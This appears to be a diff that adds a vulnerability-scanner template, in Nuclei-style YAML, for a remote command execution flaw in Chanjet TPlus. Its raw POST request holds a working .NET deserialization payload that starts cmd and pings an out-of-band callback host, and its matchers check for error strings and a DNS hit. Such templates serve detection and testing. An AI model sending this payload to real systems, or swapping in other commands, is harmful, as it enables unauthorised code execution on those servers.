@@ -1,0 +1,44 @@
+id: chanjet-tplus-rce
+
+info:
+  name: Chanjet TPlus GetStoreWarehouseByStore - Remote Command Execution
+  author: SleepingBag945
+  severity: critical
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
+        Host: {{Hostname}}
+        X-Ajaxpro-Method: GetStoreWarehouseByStore
+
+        {
+          "storeID":{
+            "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+            "MethodName":"Start",
+            "ObjectInstance":{
+            "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "StartInfo":{
+              "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+              "FileName":"cmd",
+              "Arguments":"/c ping {{interactsh-url}}"
+            }
+            }
+          }
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "actorId或archivesId不能为空"
+          - "\"Type\":\"System.ArgumentException\""
+          - "Object reference not set to an instance of an object"
+          - "System.NullReferenceException"
+        condition: or
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
